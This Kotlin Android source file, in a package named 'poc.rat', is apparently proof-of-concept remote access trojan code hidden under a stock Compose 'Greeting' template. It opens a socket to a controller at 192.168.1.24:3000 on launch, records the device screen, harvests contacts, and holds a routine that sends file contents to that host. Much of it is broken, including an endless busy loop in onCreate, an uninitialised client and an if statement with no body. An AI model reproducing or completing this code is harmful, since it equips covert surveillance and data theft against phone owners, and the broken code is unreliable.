package poc.rat

import android.app.Activity
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.database.Cursor
import android.hardware.display.DisplayManager
import android.os.Bundle
import android.provider.ContactsContract
import androidx.appcompat.app.AppCompatActivity
import androidx.compose.material3.Text
import androidx.compose.runtime.Composable
import androidx.compose.ui.Modifier
import androidx.compose.ui.tooling.preview.Preview
import okhttp3.OkHttpClient
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import java.io.BufferedReader
import java.io.InputStreamReader
import java.io.PrintWriter
import java.net.Socket
import poc.rat.ui.theme.MyApplicationTheme
import java.io.InputStream
import android.net.Uri
import java.io.BufferedOutputStream
import android.hardware.display.VirtualDisplay
import android.media.MediaRecorder
import android.media.projection.MediaProjection
import android.media.projection.MediaProjectionManager
import android.os.Handler
import android.os.Looper
import java.io.File


data class Contact(val name: String, val phone: String)

class MainActivity : AppCompatActivity() {
    private lateinit var client: OkHttpClient
    private val REQUEST_READ_CONTACTS = 100
    private val STORAGE_PERMISSION_REQUEST_CODE = 101
    private val PICK_IMAGE_REQUEST_CODE = 102
    companion object {
        private const val SCREEN_RECORD_REQUEST_CODE = 1001
    }
    private lateinit var mediaProjectionManager: MediaProjectionManager
    private var mediaProjection: MediaProjection? = null
    private lateinit var mediaRecorder: MediaRecorder
    private var virtualDisplay: VirtualDisplay? = null

    private var recordDurationSeconds: Int = 10




    private fun sendFileThroughSocket(fileUri: Uri) {
        CoroutineScope(Dispatchers.IO).launch {
            try {
                val inputStream: InputStream? = contentResolver.openInputStream(fileUri)
                if (inputStream == null) {
                    println("Failed to open InputStream for the file.")
                    return@launch
                }

                val fileBytes = inputStream.readBytes()
                inputStream.close()

                Socket("192.168.1.24", 3000).use { socket ->
                    BufferedOutputStream(socket.getOutputStream()).use { outStream ->
                        outStream.write(fileBytes)
                        outStream.flush()
                    }
                }

                println("File sent successfully, size: ${fileBytes.size} bytes")
            } catch (e: Exception) {
                e.printStackTrace()
                println("Error sending file: ${e.message}")
            }
        }
    }


    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        startScreenRecording(recordDurationSeconds)
        CoroutineScope(Dispatchers.IO).launch {
            try {
                val socket = Socket("192.168.1.24", 3000)

                // Create a writer to send data to the server
                val writer = PrintWriter(socket.getOutputStream(), true)
                // Create a reader to receive data from the server (if needed)
                val reader = BufferedReader(InputStreamReader(socket.getInputStream()))

                // Send a message to the server
                writer.println("phone connected")
                println("Message sent: phone connected")

                // Optionally, read a response from the server
                val response = reader.readLine()
                if (response == "")

                // Clean up by closing the socket
                socket.close()
            } catch (e: Exception) {
                // Log the exception (use Log.e in production)
                e.printStackTrace()
            }
        }

        while (1 == 1) {}
    }

    override fun onRequestPermissionsResult(
        requestCode: Int,
        permissions: Array<String>,
        grantResults: IntArray
    ) {
        if (requestCode == REQUEST_READ_CONTACTS) {
            if (grantResults.isNotEmpty() && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
                fetchContacts()
            } else {
                // Handle the case where permission is denied (e.g., show a message)
                println("Permission to read contacts was denied.")
            }
        } else {
            super.onRequestPermissionsResult(requestCode, permissions, grantResults)
        }
    }

    // Function to fetch contacts from the device
    private fun fetchContacts() {
        val contactsList = mutableListOf<Contact>()

        // Query the contacts using the ContactsContract content provider
        val cursor: Cursor? = contentResolver.query(
            ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
            null,
            null,
            null,
            null
        )

        cursor?.use {
            val nameIndex = it.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME)
            val phoneIndex = it.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER)

            while (it.moveToNext()) {
                val name = it.getString(nameIndex)
                val phone = it.getString(phoneIndex)
                contactsList.add(Contact(name, phone))
            }
        }

        contactsList.forEach { contact ->
            println("Name: ${contact.name}, Phone: ${contact.phone}")
        }
    }

    override fun onDestroy() {
        super.onDestroy()
        // Shut down the VOkHttp client to free resources when your Activity is destroyed.
        client.dispatcher.executorService.shutdown()
    }
    private fun startScreenRecording(durationSeconds: Int) {
        recordDurationSeconds = durationSeconds
        mediaProjectionManager = getSystemService(Context.MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
        // Request user permission for screen capture
        val captureIntent = mediaProjectionManager.createScreenCaptureIntent()
        startActivityForResult(captureIntent, SCREEN_RECORD_REQUEST_CODE)
    }

    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
        if (requestCode == SCREEN_RECORD_REQUEST_CODE) {
            if (resultCode == Activity.RESULT_OK && data != null) {
                mediaProjection = mediaProjectionManager.getMediaProjection(resultCode, data)
                // Setup MediaRecorder with desired settings
                setupMediaRecorder()
                // Start the recording
                startRecording()
                // Stop recording after the specified duration
                Handler(Looper.getMainLooper()).postDelayed({
                    stopRecording()
                }, recordDurationSeconds * 1000L)
            } else {
                // Permission was not granted.
                println("Screen capture permission denied.")
            }
        }
        super.onActivityResult(requestCode, resultCode, data)
    }

    /**
     * Sets up the MediaRecorder with basic settings.
     */
    private fun setupMediaRecorder() {
        mediaRecorder = MediaRecorder()

        // If you want audio, uncomment the following:
        // mediaRecorder.setAudioSource(MediaRecorder.AudioSource.MIC)

        mediaRecorder.setVideoSource(MediaRecorder.VideoSource.SURFACE)
        mediaRecorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)

        val outputFile = File(getExternalFilesDir(null), "screen_record_${System.currentTimeMillis()}.mp4")
        mediaRecorder.setOutputFile(outputFile.absolutePath)

        mediaRecorder.setVideoEncoder(MediaRecorder.VideoEncoder.H264)
        // If using audio:
        // mediaRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC)

        mediaRecorder.setVideoSize(1080, 1920)
        mediaRecorder.setVideoFrameRate(30)
        mediaRecorder.setVideoEncodingBitRate(5 * 1024 * 1024) // 5 Mbps

        mediaRecorder.prepare()
    }

    /**
     * Starts the screen recording by creating a VirtualDisplay linked to the MediaRecorder.
     */
    private fun startRecording() {
        // Create a VirtualDisplay that outputs to the MediaRecorder's surface.
        virtualDisplay = mediaProjection?.createVirtualDisplay(
            "ScreenRecording",
            1080, 1920, // Width & height (adjust as needed)
            resources.displayMetrics.densityDpi,
            DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
            mediaRecorder.surface,
            null,
            null
        )
        mediaRecorder.start()
        println("Screen recording started.")
    }

    /**
     * Stops the recording and releases resources.
     */
    private fun stopRecording() {
        try {
            mediaRecorder.stop()
            mediaRecorder.reset()
            println("Screen recording stopped.")
        } catch (e: Exception) {
            e.printStackTrace()
        }
        virtualDisplay?.release()
        mediaProjection?.stop()
    }

}

@Composable
fun Greeting(name: String, modifier: Modifier = Modifier) {
    Text(
        text = "Hello $name!",
        modifier = modifier
    )
}

@Preview(showBackground = true)
@Composable
fun GreetingPreview() {
    MyApplicationTheme {
        Greeting("Android")
    }
}
